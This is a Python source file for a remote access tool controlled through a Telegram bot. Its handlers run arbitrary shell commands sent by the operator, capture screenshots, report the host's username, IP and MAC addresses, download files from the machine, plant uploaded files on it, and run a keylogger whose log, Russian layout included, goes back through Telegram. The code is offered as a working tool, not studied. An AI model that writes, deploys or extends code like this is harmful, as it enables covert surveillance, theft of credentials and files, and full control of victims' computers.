import os
import mss
import subprocess
import telebot
import requests
from telebot import types
from io import StringIO
import sys
import time
import traceback
import threading
import util
import config
import keyboard
import ctypes



# packages
if sys.platform == 'win32':
    import pyHook as hook_manager
    import pythoncom
else:
    import pyxhook as hook_manager

abort = False
window = None
max_size = 4000
logs = StringIO()
threads = {}
results = {}

bot = telebot.TeleBot(config.token)
decode_charset="utf-8"
hint_cmd=0
def download_file(url,filename):
    if len(filename) > 0:
        local_filename = filename
    else:
        local_filename = url.split('/')[-1]
    # NOTE the stream=True parameter below
    r=requests.get(url, stream=True)
    r.raise_for_status()
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=8192): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                # f.flush()
    return local_filename

def shell(query):
    global decode_charset
    cmd = "bash"   #specify your cmd command
    process = subprocess.Popen(query,shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    out = process.stdout.read() + process.stderr.read()
    return out.decode(decode_charset)
 
@bot.message_handler(commands=["cmd"])
def cmd(message):
    if message.text:
        try:
            result=shell(message.text[5:])
            if result is not None:
                if len(result)>3000:
                    for i in range(0,1+int(round(len(result)/3000))):	
                        bot.send_message(message.chat.id, result[i*3000:i*3000+2999])
                else:
                    bot.send_message(message.chat.id, result)
        except Exception as error:
            bot.send_message(message.chat.id, "Error: " +str(error))
def on_exists(fname: str) -> None:
    try:
        bot.send_photo(chat_id, photo=open(fname,"rb").read())
    except:
        traceback.print_exc()

@bot.message_handler(commands=["screenshot"])
def screenshot(message):
    global chat_id
    chat_id=message.chat.id
    try:
        with mss.mss() as sct:
            filename = sct.shot(output="mon-{mon}.png", callback=on_exists)

                
    except Exception as e:
        traceback.print_exc()

@bot.message_handler(commands=["info"])
def info(message):
    bot.send_message(message.chat.id, f"{util.username()}@{util.device()}({util.platform()}-x{util.architecture()}) {util.local_ip()} / {util.public_ip()} / {util.mac_address()}")

@bot.message_handler(commands=["cd"])
def cd(message):
    try:
        os.chdir(message.text[4:])
    except Exception as error:
        bot.send_message(message.chat.id, "Error: " +str(error))

@bot.message_handler(commands=["charset"])
def charset(message):
    global decode_charset
    if len(message.text[9:]) >0: 
        decode_charset=message.text[9:]
    else:
        bot.send_message(message.chat.id, decode_charset)

@bot.message_handler(commands=["help"])
def charset(message):
    bot.send_message(message.chat.id, """Remote bot commands:
/help - get help
/charset [charset] - set/get charset
/cd [folder] - change folder
/screenshot - make and send screenshot of screen
/cmd [command] - run shell command
/get [filename] - download file <50Mb
-------------------------------------
any other message will be as a command
upload files via attach
 """)

eng_layout="""QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>qwertyuiop[]asdfghjkl;'zxcvbnm,."""
rus_layout="""ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮйцукенгшщзхъфывапролджэячсмитьбю"""

def callback(event=None):
     if not event:
         return
     user32 = ctypes.WinDLL('user32', use_last_error=True)
     curr_window = user32.GetForegroundWindow()
     thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
     klid = user32.GetKeyboardLayout(thread_id)
     lid = klid & (2**16 - 1)
     lid_hex = hex(lid)

     name = event.name
     if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
     else:
        if lid_hex=="0x419":
            pos = eng_layout.find(name)
            if pos!=-1 and pos < len(rus_layout):
                name = rus_layout[pos]

     logs.write(name)



@bot.message_handler(commands=["getkeylog"])
def getkeylog(message):
    result=logs.getvalue()
    if len(result)>3000:
        for i in range(0,1+int(round(len(result)/3000))):	
            bot.send_message(message.chat.id, result[i*3000:i*3000+2999])
    else:
        bot.send_message(message.chat.id, result)

@bot.message_handler(commands=["keylog"])
def keylog(message):
    keyboard.on_release(callback=callback)
    return

    global threads
    try:
        keyboard_listener = keyboard.Listener(on_press=on_key_press)
        keyboard_listener.start()
    except Exception as e:
        traceback.print_exc()

@bot.message_handler(commands=["get"])
def get(message):
    if os.path.getsize(message.text[5:]) >  52428800 :
        bot.send_message(message.chat.id, "Size is bigger than 50Mb: " +str(os.path.getsize(message.text[5:])))
    else:
        bot.send_document(message.chat.id, open(message.text[5:], 'rb'))

@bot.message_handler(content_types=['document'])
def handle_text_doc(message):
    f=bot.get_file(file_id=message.document.file_id)
    try:
        download_file("https://api.telegram.org/file/bot"+config.token+"/"+f.file_path,message.document.file_name)
    except Exception as error:
        bot.send_message(message.chat.id, "Error: " +str(error))

@bot.message_handler()
def other_messages(message):
    global hint_cmd
    message.text="/cmd "+message.text
    cmd(message)

if __name__ == '__main__':
    bot.polling(none_stop=True)
